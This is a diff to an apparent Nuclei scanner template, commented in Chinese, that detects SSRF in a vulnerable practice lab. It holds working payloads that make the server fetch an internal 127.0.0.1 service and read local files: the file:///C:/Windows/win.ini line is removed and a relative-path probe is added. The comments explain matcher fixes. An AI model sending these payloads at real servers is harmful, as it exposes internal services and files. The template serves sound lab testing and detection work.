@@ -24,9 +24,19 @@ info:
 
 requests:
   # ── ① 诱导服务端访问内网服务 ────────────────────────────────────
+  #
+  # url 参数完整编码，避免中间的 :// 被 HTTP 层或日志处理时截断。
+  #
+  # 判据用内网服务响应里的凭证串 —— 它只可能来自
+  # 「服务端真的替我们请求了那个地址」。
+  #
+  # ⚠️ 这里踩过一个判据坑：早先还有一条 matcher 写的是
+  #    `"service": "internal-admin-api"`（引号未转义），于是**永远匹配不上** ——
+  #    因为靶场页面是用 htmlspecialchars() 渲染取回的正文的，
+  #    引号在 HTML 里是 `&quot;`。
+  #    下面改成容错正则：转义与否都能命中。
   - method: GET
     path:
-      # url 参数完整编码，避免中间的 :// 被 HTTP 层或日志处理时截断
       - "{{BaseURL}}/ssrf/low.php?url=http%3A%2F%2F127.0.0.1%3A8090%2Finternal%2Finner-service.php"
 
     matchers-condition: and
@@ -34,20 +44,17 @@ requests:
       - type: status
         status: [200]
 
-      # 真的读到了内网服务的内容
       - type: word
         part: body
         words:
           - "VULNLAB{ssrf_reached_internal_service}"
 
-      # 排除「页面只是展示了目标地址」的情况 ——
-      # 靶场页面会把用户输入的 URL 显示出来，所以光看 URL 字符串会误判。
-      # 用内网服务响应里的独特字段做判据才可靠。
-      - type: word
+      # 交叉验证：内网服务的响应里确实带着这个字段
+      # （`"` 与 `&quot;` 两种形态都接受）
+      - type: regex
         part: body
-        words:
-          - "\"service\": \"internal-admin-api\""
-        condition: or
+        regex:
+          - "(&quot;|\")service(&quot;|\")\\s*:\\s*(&quot;|\")internal-admin-api(&quot;|\")"
 
     extractors:
       - type: regex
@@ -56,29 +63,43 @@ requests:
         regex:
           - "(VULNLAB\\{ssrf_reached_internal_service\\})"
 
-  # ── ② 本地文件读取（file 协议）───────────────────────────────────
+  # ── ② 不限制协议 → 退化成任意文件读取 ────────────────────────────
   #
-  # 单独一条请求：它证明 SSRF 不只能打内网，还能直接读服务器本地文件。
-  # 这是 SSRF 危害的另一个维度，值得单独检测。
+  # low 档「协议不限」意味着 `file://` / `php://` 这类包装器照样能用，
+  # 于是 SSRF 在这里同时也是一个文件读取漏洞。
+  #
+  # ⚠️ 用相对路径读靶场自带的演示文件，而不是 `file:///C:/Windows/win.ini`：
+  #    绝对路径绑定系统与安装位置，换台机器就失效。
+  #    实测 `file:///C:/Windows/win.ini` 在本机就读不出预期内容
+  #    （win.ini 存在，但没有判据要找的那行），整条请求永远 0 命中。
+  #    相对路径的好处是：它同时利用了「不限制协议」——
+  #    `file_get_contents()` 拿到没有 scheme 的字符串就按本地路径处理。
   - method: GET
     path:
-      - "{{BaseURL}}/ssrf/low.php?url=file%3A%2F%2F%2FC%3A%2FWindows%2Fwin.ini"
+      - "{{BaseURL}}/ssrf/low.php?url=..%2Flfi_probe.txt"
 
     matchers-condition: and
     matchers:
       - type: status
         status: [200]
 
-      # win.ini 的固定内容 —— Windows 上一定存在这个文件
       - type: word
         part: body
         words:
-          - "for 16-bit app support"
+          - "VULNLAB_LFI_PROBE_MARKER"
 
+      # 负向判据只认「请求失败」——
+      # 「无法解析」不能当失败证据：页面在代码回显区里会打印
+      # `协议: (无法解析) / 主机: (无法解析)`，**每次请求都会出现**。
       - type: word
         part: body
-        words:
-          - "无法解析"
-          - "请求失败"
+        words: ["请求失败"]
         condition: or
         negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_file
+        regex:
+          - "(VULNLAB_LFI_PROBE_MARKER)"
